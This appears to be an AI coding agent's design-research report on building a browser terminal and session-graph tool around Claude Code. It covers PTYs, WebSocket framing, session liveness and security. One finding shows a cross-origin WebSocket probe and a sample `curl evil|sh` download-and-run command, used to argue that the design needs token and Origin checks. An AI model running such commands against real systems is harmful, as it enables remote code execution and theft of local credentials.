# Research — perspective: IMPLEMENTATION STACK AND DELIVERY (attempt 1)

Scope: runtime, transport, terminal emulation, graph rendering, process model,
state/reconnect, auth/exposure, testability, repo layout for `aggregator` +
`touch-visual`.

Everything below was verified on this machine. Probes ran in
`/tmp/claude-1000/{stackprobe,stackpty,wsprobe,asyncpty*}`; the only writes into
the live task folder are the two mandated `status.sh` calls and this file.

**Headline**: the repo's "zero third-party dependency" premise and the sandbox's
"firewall blocks everything" premise are both *false as stated* — npm and PyPI
both install fine here. The real constraints are different and sharper: no C++
toolchain (so `node-pty` cannot build), no runtime egress guarantee (so nothing
may be fetched from a CDN at page load), one published port, and an existing
WebSocket server that is **structurally incapable of receiving anything**.

---

## STACK-1 — No local control channel exists on a running CLI process; Touch must OWN the PTY it wants to drive
**Evidence**
- `/home/agent/.claude/sessions/622.json` — the live interactive session's registry
  entry has **no** `messagingSocketPath`.
- Binary `/home/agent/.local/share/claude/versions/2.1.220`:
  `grep -ao 'messagingSocketPath[^,;}]\{0,120\}'` → the *producer* side is
  `...,messagingSocketPath:r}` preceded by `let r;` — i.e. it is emitted
  `undefined` in this build. The *consumer* side only reads it back out of the
  `sessions/<pid>.json` files.
- `find /home/agent/.claude /tmp -maxdepth 3 -name "*.sock"` → nothing owned by
  the interactive session.
- `--remote-control` exists but is an **Anthropic-cloud bridge**, not a local API:
  strings `bridge-failed`, `runBridgeLoop`, `/v1/sessions`, and the user-facing
  copy *"This terminal now has its own copy of the session: new work here stays
  local and will not appear in the Claude app."*

**Severity: blocker (architecture-defining)**

**Scenario** — README.md:3-5 says the sidebar lists "such terminal sessions" and
clicking one "opens that terminal", implying any session the user already has
open. A naive build ships a sidebar that enumerates
`~/.claude/sessions/*.json`, and every session the user started in their own
terminal renders as a dead read-only pane: keystrokes go nowhere, and the
pause/restart/terminate buttons are inert.

**Recommendation** — split the model explicitly and surface it in the UI:
- **Owned sessions**: Touch spawns `claude` itself under a PTY it holds. Fully
  interactive, fully controllable. This is the only class the terminal-fidelity
  and control requirements can be met for.
- **Observed sessions**: any other live/finished session. Read-only *transcript
  replay* from `~/.claude/projects/<slug>/<sessionId>.jsonl` + task
  `events.jsonl`. Render as a distinct pane type (no cursor, no input box, an
  explicit "read-only — not started by Touch" chip) so the affordance never lies.

Do not attempt to "attach" to a foreign PID. There is no supported mechanism and
no unsupported one either.

---

## STACK-2 — `CLAUDE_CODE_CHILD_SESSION` is inherited and silently disables transcript persistence in every session Touch spawns
**Evidence**
- Current env (this agent, i.e. anything an agent launches):
  `CLAUDE_CODE_CHILD_SESSION=1`, `CLAUDECODE=1`,
  `CLAUDE_CODE_SESSION_ID=dd469822-…`, `CLAUDE_CODE_ENTRYPOINT=cli`, `CLAUDE_PID=622`.
- `/tmp/claude-1000/ptyclaude/run.py` — spawned `claude` under a stdlib PTY with
  the inherited env. Captured bytes contain, verbatim:
  `⚠ Transcript saving is off — inherited CLAUDE_CODE_CHILD_SESSION marker · restart with CLAUDE_CODE_FORCE_SESSION_PERS…`
- `/tmp/claude-1000/stackpty/run2.py` — identical spawn with
  `{k:v for k,v in os.environ.items() if not k.startswith(("CLAUDE","CLAUDECODE","AI_AGENT"))}`
  → `HAS_WARNING: False`.
- Binary confirms the override name: `grep -aoE 'CLAUDE_CODE_FORCE_SESSION_[A-Z_]*'`
  → `CLAUDE_CODE_FORCE_SESSION_PERSISTENCE`.

**Severity: blocker**

**Scenario** — Touch's daemon is (realistically) started from inside a Claude
Code session, e.g. by an implementer agent, exactly the way
`monitor_server.py` is started today (CLAUDE.md:107-111). Every session it spawns
inherits the marker, writes **no** `~/.claude/projects/.../<sessionId>.jsonl`,
and the entire touch-visual half — graph, timeline, token accounting, artifacts —
has zero data for precisely the sessions Touch created. The terminal still works,
so the bug looks like "the graph page is broken" and is very hard to trace.

**Recommendation** — build the child env from an **allowlist**, never by
inheritance: `PATH`, `HOME`, `USER`, `LANG`, `TERM=xterm-256color`, `COLUMNS`,
`LINES`, `SHELL`, `TZ`, proxy vars, `SANDBOX_VM_ID`, plus whatever the user
explicitly configures. Additionally set
`CLAUDE_CODE_FORCE_SESSION_PERSISTENCE=1` as a belt-and-braces measure, and add a
startup self-check that asserts a transcript file appears within N seconds of the
first prompt, surfacing a loud banner if it does not.

---

## STACK-3 — The existing server has no auth and no `Origin` check; bolting a PTY onto it is remote code execution
**Evidence**
- `monitor_server.py:519` — `asyncio.start_server(handle, "0.0.0.0", PORT)`.
- `monitor_server.py:411-447` — the `/ws` branch inspects only
  `sec-websocket-key` / `sec-websocket-version`. `origin` is parsed into
  `headers` (`:407-410`) and never read.
- Empirical (`/tmp/claude-1000/wsprobe`, a throwaway copy of the module on port
  8977): a handshake carrying `Origin: http://evil.example` returned
  `HTTP/1.1 101 Switching Protocols`. WebSockets are **not** subject to CORS, so
  this is reachable from any page the user visits.
- The blast radius is concrete: `~/.claude/.credentials.json` is present (mode
  0600, i.e. readable by the daemon's own uid), and `~/.claude/settings.json` has
  `"defaultMode": "bypassPermissions"` with
  `"bypassPermissionsModeAccepted": true`. The live session runs
  `claude --dangerously-skip-permissions` (`ps aux`, pid 622).

**Severity: blocker**

**Scenario** — Touch adds `{"type":"input","data":"..."}` to the WS so the
browser can type. Any web page open in the user's browser opens
`ws://localhost:8931/ws`, is accepted, and types `curl evil|sh\n` into a
bypass-permissions Claude Code session. Publishing the port to the host
(`sbx ports … --publish 8931:8931/tcp`, CLAUDE.md:113) widens this to the LAN.

**Recommendation** — before any inbound message is honoured:
1. Mint a random 32-byte token at daemon start; print it in the startup line
   (like `monitor listening on …`, `monitor_server.py:523`) and require it on
   both the page load and the WS upgrade (`?t=…`, compared with
   `hmac.compare_digest`).
2. Reject upgrades whose `Origin` is not in an allowlist derived from the bind
   host/port; reject a *missing* `Origin` too for control sockets (non-browser
   clients get the token via a header instead).
3. Default bind to `127.0.0.1`; require an explicit `--listen 0.0.0.0` (or
   `TOUCH_BIND`) for the sandbox-publish workflow, and print a warning when it is
   used. The read-only observation endpoints may stay laxer than the control ones,
   but keep the split explicit rather than emergent.

---

## STACK-4 — The current WebSocket implementation is unidirectional by construction
**Evidence**
- `monitor_server.py:279-310` `parse_client_frames` never unmasks: it computes
  `idx` past the 4-byte masking key and then `del buf[:idx + length]` (`:307`) —
  the payload is thrown away without being read.
- `monitor_server.py:313-327` `drain_client` docstring: *"Discard incoming frames
  (pongs)"*; it only sets a close flag.
- `monitor_server.py:358-388` `stream_events` is write-only.
- Empirical: sending a well-formed masked text frame
  `{"type":"input","data":"ls\n"}` to the probe server produced no reaction, no
  error, no log line.

**Severity: major**

**Scenario** — a plan that says "extend `monitor_server.py` with control
messages" underestimates the work: there is no unmask step, no frame reassembly
for continuation frames, no message-boundary dispatch, and no per-connection
identity. Keystrokes also arrive at a very different rate than events (dozens/sec
vs one every few seconds).

**Recommendation** — write a **new** `aggregator/ws.py` with a proper RFC-6455
codec (mask/unmask, opcode 0x0 continuation reassembly, 0x9/0xA ping-pong, close
codes, a max-message cap) and unit-test it directly (it is a pure function over
bytes — exactly the shape `test_server.py:159-205` already tests). Keep
`monitor_server.py` untouched so its four tests keep passing; share the codec by
import if the module is later refactored, not by editing it in place under a
running orchestration.

---

## STACK-5 — The 0.5 s poll loop is a hard latency floor that a terminal cannot live with
**Evidence**
- `monitor_server.py:365-378` — `read_frames` off-thread, then
  `await asyncio.sleep(0.5)` every tick; keepalive ping every 40 ticks (~20 s).
- Verified working alternative (`/tmp/claude-1000/asyncpty.py`): `pty.openpty()` +
  `subprocess.Popen(stdin=slave, stdout=slave, stderr=slave, start_new_session=True)`
  + `os.set_blocking(master, False)` + `loop.add_reader(master, …)` streams PTY
  output with no polling, inside a normal `asyncio.run()`.

**Severity: major**

**Scenario** — reusing the tail-a-file-every-500 ms pattern for terminal output
gives 0–500 ms echo latency on every keystroke. Users read that as "the terminal
is broken", and it is unfixable by tuning (dropping to 10 ms turns the loop into
a busy-spin over `os.path.getsize`).

**Recommendation** — two different transports on one port:
- **PTY channel** (`/pty?session=…`): event-driven via `loop.add_reader` on the
  master fd; coalesce reads into ≤16 KB frames at ≤60 fps.
- **Event channel** (`/ws?task=…`): keep the existing file-tail semantics; 0.5 s
  is fine for orchestration events.

Do **not** use `pty.fork()` (used in the probe `/tmp/claude-1000/ptytest.py`) —
forking a process that already has an asyncio event loop is unsafe. `openpty` +
`Popen` is the pattern that was verified to work in-loop.

---

## STACK-6 — `node-pty` cannot build here; the PTY tier must be Python
**Evidence**
- `cd /tmp/claude-1000/stackprobe && npm install node-pty` →
  `make: g++: No such file or directory` /
  `gyp ERR! stack Error: make failed with exit code: 2`. No `build/Release/`
  produced. `which g++ cc` → empty (only `make`, `node-gyp`, `python3` exist).
- `apt-get install -s -y g++` *would* succeed (Ubuntu 25.10 repos reachable
  through the proxy), so this is fixable — at the cost of a mandatory
  `apt install build-essential` in the run instructions and a per-node-version
  native rebuild.
- Python stdlib alternative verified end to end
  (`/tmp/claude-1000/ptytest.py`): `pty.fork()`/`pty.openpty()`,
  `fcntl.ioctl(fd, termios.TIOCSWINSZ, struct.pack("HHHH", rows, cols, 0, 0))`
  (`tput cols` inside the PTY correctly printed `120`), non-blocking reads,
  full 24-bit-colour ANSI passthrough.

**Severity: major**

**Recommendation** — the aggregator is a **Python 3 asyncio process**. This also
keeps it aligned with `monitor_server.py` / `decision_watcher.py`, keeps the test
story in one language (STACK-16), and removes Node from the runtime
prerequisites entirely (Node stays a *build-time-only* tool for vendoring, see
STACK-8).

---

## STACK-7 — "terminate" and "pause" have no correct signal-level implementation; SIGTERM does not kill an interactive TUI
**Evidence** — `/tmp/claude-1000/asyncpty2.py`, five probes against an
interactive `bash` in its own session/PGID:
```
SIGTERM          SURVIVED
SIGHUP           rc=-1 in 0.00s
SIGKILL          rc=-9 in 0.00s
close-master     rc=-1 in 0.00s     (closing the PTY master delivers SIGHUP)
ctrl-D           rc=0  in 0.00s     (clean exit)
```

**Severity: major**

**Scenario** — the obvious implementation (`os.killpg(pgid, SIGTERM)`) leaves a
zombie Claude Code session holding the PTY. The UI shows "terminated"; the
process is still running, still billing tokens, still writing to the transcript.

**Recommendation** — an explicit escalation ladder, each step with a deadline,
each step surfaced in the UI:
1. Application-level quit: write the TUI's own quit sequence into the PTY
   (`/exit\r`, or `\x03\x03` for the double-Ctrl-C convention). Wait ~3 s.
2. `os.killpg(pgid, SIGHUP)` (equivalently close the master fd). Wait ~2 s.
3. `os.killpg(pgid, SIGKILL)`.
Always `start_new_session=True` so step 2/3 cannot reach Touch's own process
group. Reap with `waitpid` and only then remove the session from the sidebar.

For **pause**: `SIGSTOP`/`SIGCONT` is the only true process-level pause, and it
will stall in-flight HTTPS streaming and can trip server-side request timeouts.
Do not present it as "pause the agent loop". See STACK-18 for what "pause a loop"
can actually mean.

---

## STACK-8 — npm and PyPI both work here; the real constraint is *runtime* offline-safety, not install-time
**Evidence**
- `npm install @xterm/xterm @xterm/addon-fit dagre elkjs cytoscape mermaid` — all
  succeeded (115 packages, 11 s).
- `pip3 install --dry-run --break-system-packages websockets` — resolved and
  downloaded metadata + wheel successfully.
- Egress is a CONNECT proxy, not a hole-punch: `https_proxy=http://gateway.docker.internal:3128`,
  `PROXY_CA_CERT_B64=…`. That is a per-domain allow policy that this sandbox
  happens to satisfy for the two registries; a *browser* loading the Touch page
  from the host gets no such treatment, and CLAUDE.md's own guidance is
  default-deny.

**Severity: major (a decision, not a defect)**

**Scenario** — someone reads `monitoring.md:11` ("Zero third-party
dependencies") as a hard product constraint and hand-rolls a terminal emulator
(STACK-9). Or, the opposite failure: someone adds
`<script src="https://cdn.jsdelivr.net/…xterm…">` because "npm works", and the
page is blank the moment it is opened anywhere with a stricter policy — including
from the host after `sbx ports … --publish`, where the browser is outside the
sandbox entirely.

**Recommendation** — codify the actual rule, which is narrower than "zero deps":
- **Runtime**: Python **stdlib only**, and **zero network fetches from the page**.
  Everything the browser needs is served by the daemon from disk.
- **Build/vendor time**: `npm` is allowed as a *tool* to fetch a pinned asset,
  which is then **committed** into the repo with its licence and a
  `vendor/VERSIONS.txt` recording package@version + sha256.
- Note `.gitignore:18-19` ignores `node_modules/` and `dist/` — so vendored
  assets must live at e.g. `touch-visual/vendor/`, never inside `node_modules/`,
  or they silently will not be committed and a fresh clone will 404.

---

## STACK-9 — The real Claude Code TUI needs a real terminal emulator; a `<pre>`-based renderer will not work
**Evidence** — bytes captured from a live `claude` under a PTY
(`/tmp/claude-1000/ptyclaude/run.py`, 4213 bytes in the first 14 s) contain:
`\x1b[?1049h` (alternate screen buffer), `\x1b[?1000h \x1b[?1002h \x1b[?1003h
\x1b[?1006h` (mouse click + drag + any-motion tracking, SGR encoding),
`\x1b[?2004h` (bracketed paste), `\x1b[?1004h` (focus in/out), `\x1b[>0q`/`\x1b[c`
(terminal identification queries — the app *expects replies*), `\x1b[38;2;215;119;87m`
(24-bit colour), absolute cursor addressing (`\x1b[40;1H`, `\x1b[37;3H`),
`\x1b]0;…\x07` (OSC title), and box-drawing UTF-8.

**Severity: major**

**Scenario** — a hand-rolled ANSI-to-HTML renderer handles SGR colours, then
falls apart on the alt-screen switch, cursor addressing and the DA1 query the app
waits for a response to. The pane freezes or renders garbage, and the fix is
"write a terminal emulator".

**Recommendation** — vendor **xterm.js**. Measured: `@xterm/xterm/lib/xterm.js`
= 489 KB (UMD, exposes a global `Terminal`, no bundler needed) +
`css/xterm.css` = 7 KB; add `@xterm/addon-fit` for resize. Two files, dropped in
`touch-visual/vendor/`, loaded with plain `<script>`/`<link>` from the daemon.
Wire `term.onData` → WS `{"type":"input"}` and `term.onResize` → WS
`{"type":"resize", cols, rows}` → `TIOCSWINSZ` on the master fd (verified
working). Terminal identification queries answer themselves once the emulator is
real — that is precisely what you are buying.

If the 489 KB is judged unacceptable, the honest consequence is to drop the
"terminal design / primary interface" requirement, not to hand-roll.

---

## STACK-10 — Do not vendor a graph-layout engine; the loop DAG has a known fixed rank structure and a prototype already exists in-repo
**Evidence**
- Measured install sizes: `dagre` 960 KB (`dagre.min.js` 284 KB,
  `dagre.core.min.js` 69 KB), `elkjs` 7.8 MB (`elk.bundled.js` 1.6 MB),
  `cytoscape` 6.1 MB (`cytoscape.min.js` 435 KB), `mermaid` **84 MB**.
- The graph's shape is fully determined by the two templates, not by data:
  `execute-research/templates/research.workflow.js:136-153` → Research (N
  parallel perspectives) → barrier → Synthesize (1);
  `implement-plan/templates/implement.workflow.js:255-352` → Divide (1) →
  per-sub-plan `runLoop` (impl → test → critique, with a back-edge on failure,
  `:168-206`) → FinalGate (gate → fix → gate, `:330-349`). Ranks are known a
  priori; only *counts* vary.
- `monitor.html:296-318` already builds exactly this: a flow strip of role nodes
  with `→` arrows and a `↺ attempt N` loop-back marker, using `createElement` +
  whitelisted `className` + `textContent`.

**Severity: minor (a decision that avoids a large mistake)**

**Recommendation** — hand-roll a layered SVG layout (~200 lines): rank =
phase index, y = index within rank, edges as cubic béziers with the
left→right control-point convention n8n uses, plus one back-edge style for the
retry loop. Give every node a **stable id** (`plan:stage:role:attempt`) so live
updates patch `class`/`fill`/text on an existing element and never re-layout —
that is what makes the graph feel live rather than flickering. Reuse
`monitor.html`'s escape-first rule (never interpolate agent-controlled strings
into `innerHTML`, cf. `monitor.html:296-318` and the guard in
`tests/test_frontend.py`).

---

## STACK-11 — The two halves read from two different roots, and only one of them has any containment logic today
**Evidence**
- Repo-local: `monitor_server.py:21` `TASKS_ROOT = …/.claude/local-orchestrators`;
  `:148-151` `resolve_task_dir` only accepts names that match discovered dirs;
  `:199-212` `safe_artifact_path` does extension whitelist + `realpath`
  containment.
- Home-local (needed by the aggregator, entirely outside that containment):
  `~/.claude/projects/<slug>/<sessionId>.jsonl`,
  `~/.claude/projects/<slug>/<sessionId>/subagents/agent-*.jsonl` + `.meta.json`,
  `.../subagents/workflows/<runId>/journal.jsonl`, `~/.claude/sessions/<pid>.json`,
  `~/.claude/history.jsonl`, `~/.claude/todos/`, `~/.claude/file-history/`.
- Same tree also holds `~/.claude/.credentials.json` (0600) and
  `~/.claude/settings.json`.

**Severity: major**

**Scenario** — the aggregator grows a convenient `/file?path=…` over `~/.claude`
mirroring the existing task-artifact endpoint. One `..` bug, one symlink, one
forgotten extension check and the endpoint serves the OAuth credentials to an
unauthenticated 0.0.0.0 socket (STACK-3).

**Recommendation** — never expose a path parameter over `~/.claude`. Expose
**typed, projected** endpoints only: `/sessions`, `/session/<sessionId>/events?since=<seq>`,
`/runs/<runId>/graph`. The server resolves paths from validated ids (sessionId
must match a UUID regex; runId must match `wf_[0-9a-f-]+`), reads, projects to the
fields the UI needs, and returns JSON. Keep the existing repo-local
`/artifacts`+`/file` pair as-is; do not generalise it.

---

## STACK-12 — Session liveness: the registry contains ghosts, and `claude agents --json` is the supported enumeration
**Evidence**
- `procStart` in `~/.claude/sessions/<pid>.json` is exactly
  `/proc/<pid>/stat` field 22: `awk '{print $22}' /proc/622/stat` → `10028`,
  session file `procStart` → `"10028"`. Cheap, stdlib, race-free against PID reuse.
- Ghosts are real but self-healing *only when a `claude` process runs*: after I
  SIGKILLed a probe session, `~/.claude/sessions/6940.json` persisted on disk with
  `"status":"idle"`; a later `claude agents --json` did **not** list it and the
  file was subsequently reaped. Touch never runs `claude`, so for Touch the ghost
  is permanent.
- `claude agents --json` is a first-class, TTY-free scripting surface (documented
  in `claude agents --help`: *"does not require a TTY"*). Output includes `pid`,
  `cwd`, `kind` (`interactive`|`background`), `sessionId`, `name`, `status`, and
  `state` for background ones. Measured cost: **0.61–0.71 s per invocation** (275 MB
  binary spawn).
- Raw scan cost of `~/.claude/projects` (24 files): **0.39 ms**.

**Severity: major**

**Recommendation** — two-speed session discovery:
- **Fast path (≈250 ms)**: read `~/.claude/sessions/*.json`, filter by
  `os.path.exists(f"/proc/{pid}")` **and** `stat field 22 == procStart`. This is
  the sidebar's live truth and costs sub-millisecond.
- **Slow path (≈10 s, or on demand)**: `claude agents --json` for reconciliation,
  background-agent state, and as a side-effecting ghost reaper.
- Key every session on **`(pid, procStart)`**, never on `sessionId`: `sessionId`
  is a mutable field patched in place, and `/clear`/`/compact` rotate it under a
  stable pid (this is exactly what `decision_watcher.py:74-100` already works
  around with its `WF_GLOB_ROOT` multi-session glob).
- Never call `claude agents --json` per browser request (0.65 s × N clients is a
  self-DoS); cache it with a TTL.

---

## STACK-13 — Reconnect/replay semantics differ per channel and must be designed, not inherited
**Evidence**
- Events: `monitor_server.py:358-370` replays from offset 0 on every connect;
  `monitor.html` resets and rebuilds (documented in `monitoring.md:172-175`).
  Truncation is signalled by the `-1` sentinel (`monitor_server.py:343-344`) and
  handled by closing the socket so the client rebuilds.
- Transcript scale today: the live session JSONL is 781 448 bytes / 310 lines and
  **parses in 6 ms**. Full replay is affordable at this size; it will not stay
  this size for a day-long session.
- A PTY has no such file. Its "history" exists only in Touch's memory.

**Severity: major**

**Recommendation** —
- **Events / transcripts**: keep byte-offset tailing (`read_frames`'s
  "complete lines only, leave the partial tail" rule at `monitor_server.py:330-355`
  is correct and should be reused verbatim). Add `?since=<byteOffset>` so a
  reconnect does not re-send megabytes; keep the truncation sentinel.
- **PTY**: maintain a bounded server-side scrollback ring per owned session
  (256 KB is ~2 full alt-screens at 200×50) and replay it on connect, *then*
  stream live. Without it, a browser refresh yields a blank terminal.
- **Multi-viewer**: decide explicitly whether two browser tabs on the same
  session are both writable (shared tmux-like) or one writer + N observers. Both
  are defensible; silently allowing two writers into one PTY interleaves
  keystrokes and corrupts input.
- Re-resolve the transcript path on every tick — do not cache the resolved
  `<sessionId>.jsonl` filename, because the id rotates under a stable pid.

---

## STACK-14 — No inotify in the stdlib; poll, and size the poll from measurement
**Evidence** — `import inotify_simple` → ImportError; nothing equivalent in the
stdlib. Measured full `os.walk` + `stat` over `~/.claude/projects`: 0.39 ms for 24
files (20-iteration average).

**Severity: minor**

**Recommendation** — poll. 250 ms over `~/.claude/sessions/` and the *open*
transcripts is ~1 ms of work per tick. Do not add `watchdog`. Stat-then-read
(compare `(st_mtime_ns, st_size)` before opening) — the pattern
`monitor_server.py:65-85` already uses for its `_STATUS_CACHE` — keeps the cost
flat as history accumulates.

---

## STACK-15 — One process, one port, no build step
**Evidence**
- CLAUDE.md:113 — reaching the sandbox requires the *user* to run
  `sbx ports $SANDBOX_VM_ID --publish 8931:8931/tcp` on the host, per port.
- CLAUDE.md:114 / `monitor_server.py:519` — the bind must be `0.0.0.0`.
- `monitor_server.py:495-506` — every unrecognised route falls through to serving
  `monitor.html`; there is no static-asset route at all today.

**Severity: minor**

**Scenario** — a Vite/webpack dev server on :5173 plus an API on :8931 means two
`sbx ports` invocations, two `--publish` lines in the docs, a proxy config, and a
production/dev divergence — for a tool whose whole point is being trivially
runnable next to an agent run.

**Recommendation** — a single `python3 aggregator/server.py` on one port serving:
`/` (app shell), `/static/*` (whitelisted extension + `realpath`-contained under
`touch-visual/`, mirroring `safe_artifact_path`), `/api/*` (JSON), `/ws` (events),
`/pty` (terminal). No bundler, no transpiler: ES modules + `<script>` tags, the
same "one self-contained page" discipline `monitor.html` already demonstrates.
Port resolution should copy `resolve_port()` (`monitor_server.py:225-241`):
`argv > $TOUCH_PORT > config > default`, and it must **not** default to 8931 —
that port is occupied by the live monitor (`ps aux` shows `monitor_server.py`
running as pid 4614). Pick 8932.

---

## STACK-16 — Test story: the existing convention does not cover a PTY, a socket, or browser JS
**Evidence**
- `CLAUDE.md:89-94` — four stdlib-only files, each executable, run by hand, no
  runner. `tests/test_server.py:8-17` fakes `STATE_DIR`/`PORT` at import into a
  `tempfile` dir; `test_frontend.py` asserts on `monitor.html` **source text**
  because "the HTML is never executed by Python".
- `test_shell.py:14-20,155` asserts on repo-root `.gitignore` content and on
  template/doc text — i.e. static guards are an accepted test genre here.

**Severity: minor**

**Recommendation** —
- Keep every decision in Python so it is testable: frame codec, escalation
  ladder, env allowlist, id validation, graph model derivation. Keep browser JS
  thin (render a model the server computed).
- New files, same style: `tests/test_ws_codec.py` (pure bytes in/out, incl. a
  masked client frame and a fragmented message), `tests/test_pty.py` (spawn
  `cat`, assert echo, assert `TIOCSWINSZ` via `stty size`, assert the
  SIGHUP→SIGKILL ladder reaps within the deadline — all four behaviours were
  verified reproducible above), `tests/test_aggregator.py` (session liveness
  against a synthetic `/proc`-free fixture; id-validation rejects `../`),
  `tests/test_touch_frontend.py` (static guards: no `http://`/`https://` asset
  URL anywhere in the served HTML/JS — this is the mechanical enforcement of
  STACK-8; no `innerHTML` with an interpolated agent string).
- Eight hand-run files is past the point where "run them by hand" survives
  contact: add `tests/run_all.sh` (a `for f in test_*.py; do python3 "$f" || fail`
  loop, no framework) and update CLAUDE.md:89-94 in the same change.
- Guard the interpreter floor: `decision_watcher.py` uses PEP-604 `str | None`
  (3.10+); `__pycache__` holds both `cpython-313` and `cpython-314` artefacts, so
  the repo already runs under two interpreters. Declare **3.11+** and assert it at
  daemon start with a clear message rather than a SyntaxError.

---

## STACK-17 — Repo layout: app source must not live under `.claude/`
**Evidence** — CLAUDE.md:47-49,203-212 declare `.claude/` to be
skills + a *stateless* shared module + per-task state. `.gitignore:9` ignores
`.claude/local-orchestrators/*/*.log` only; `:18-19` ignore `node_modules/` and
`dist/`. `test_shell.py:155-161` asserts the two monitoring ignore lines are
present, so `.gitignore` edits must be additive.

**Severity: minor**

**Recommendation**
```
aggregator/          # python package: server.py, ws.py, pty.py, sessions.py, model.py
touch-visual/        # index.html, app.js, graph.js, terminal.js, style.css
touch-visual/vendor/ # xterm.js + xterm.css, pinned + committed (VERSIONS.txt with sha256)
tests/               # test_*.py + run_all.sh, stdlib only, executable
```
Add to `.gitignore`: `aggregator/__pycache__/`, `*.pyc` (already covered by
`__pycache__/`), and whatever runtime state Touch writes (e.g.
`.touch/` for scrollback spool / pty logs) — while preserving lines 5-6 verbatim
so `test_shell.py` keeps passing. Do **not** put Touch state inside
`.claude/local-orchestrators/` — that directory is monitoring history that
CLAUDE.md forbids deleting.

---

## STACK-18 — "Pause / restart a loop" has no external API; the control plane is *typed input into an owned PTY*, and that is racy
**Evidence**
- Binary strings, verbatim:
  `Resume the paused workflow by calling: Workflow({scriptPath: '…', resumeFromRunId: '…'})`,
  `completed agents return cached results.`,
  `To resume after editing the script, call: Workflow({scriptPath: '…', resumeFromRunId: '…'})`.
  Resumption is an **in-session tool call**, i.e. it happens because the model in
  that session decides to make it.
- The journal is the only external artefact and it is append-only observation:
  `wf_829e6f58-b2f/journal.jsonl` currently holds six `{"type":"started",…}`
  records and nothing else.
- The only readiness signal is `status` in `~/.claude/sessions/<pid>.json`
  (`idle|busy|…`, plus `waitingFor`), and it is written by the session itself with
  **no heartbeat** (STACK-12).
- A genuinely local PTY-over-unix-socket surface *does* exist, but only for
  background agents: `ps aux` shows
  `claude bg-pty-host --bg-pty-host /tmp/cc-daemon-1000/939665dd/pty/8084340e.sock 200 50 -- …`,
  and `/tmp/cc-daemon-1000/939665dd/` contains `control.sock`, `pty/<id>.sock`,
  `spare/<id>.{pty,claim}.sock`, `rv/<id>.sock`. It is undocumented, has a
  hard-coded 200×50 geometry, and its layout is version-coupled to the binary.

**Severity: major**

**Scenario** — the control buttons are wired to "write text into the PTY". The
user clicks *Pause* while the session is mid-tool-call (`status: "busy"`): the
text lands in the input queue and is executed minutes later, or is swallowed by a
permission dialog (`waitingFor: "dialog open"`), or interleaves with a
`--dangerously-skip-permissions` run that is already editing files. The button
appears to do nothing, then does something unexpected.

**Recommendation**
- Implement control as **queued, acknowledged intents**, not fire-and-forget
  keystrokes: the button enqueues, the daemon writes only when the session's
  `status` is `idle`, and the UI shows `queued → sent → observed` where "observed"
  is a *derived* confirmation from `events.jsonl`/journal, not an assumption.
- Give each verb an honest definition and label it in the UI:
  *Start* = spawn a new owned session and send the skill invocation;
  *Restart* = new session + `Workflow({scriptPath, resumeFromRunId})` (cached
  agents make this cheap, per the binary's own text);
  *Terminate* = the STACK-7 ladder;
  *Pause* = **stop at the next boundary** (do not send the next prompt / stop
  spawning the next attempt), never `SIGSTOP`. Mid-`agent()` there is no
  resumable boundary — `implement.workflow.js:168-206` shows the loop's state is
  `openFindings` + files on disk, and the skills' invariant is a brand-new
  subagent every attempt.
- Do not build on `/tmp/cc-daemon-1000/**`. Record it in the design doc as
  "exists, deliberately not used", with the reason (undocumented, fixed geometry,
  version-coupled, background-only) so the next person does not re-discover it and
  assume it was missed.

---

## Summary of stack decisions this perspective recommends

| Concern | Decision | Driven by |
|---|---|---|
| Runtime | Python 3.11+ asyncio, single process, single port | STACK-6, STACK-15 |
| PTY | stdlib `pty.openpty` + `Popen(start_new_session=True)` + `loop.add_reader` | STACK-5, STACK-6 |
| Transport | new RFC-6455 codec; `/pty` event-driven, `/ws` 0.5 s file-tail | STACK-4, STACK-5 |
| Terminal | vendored xterm.js (489 KB + 7 KB CSS), no bundler | STACK-9 |
| Graph | hand-rolled layered SVG, stable node ids, incremental patch | STACK-10 |
| Deps | stdlib at runtime, npm only to vendor committed assets, zero page-load fetches | STACK-8 |
| Data access | typed projected endpoints over `~/.claude`; no path parameter | STACK-11 |
| Sessions | `(pid, procStart)` identity; fast `/proc` liveness + slow `claude agents --json` | STACK-12 |
| Auth | token + Origin allowlist; default bind 127.0.0.1 | STACK-3 |
| Control | queued intents gated on `status: idle`; documented escalation ladder | STACK-7, STACK-18 |
| Layout | `aggregator/`, `touch-visual/`, `tests/` at repo root | STACK-17 |
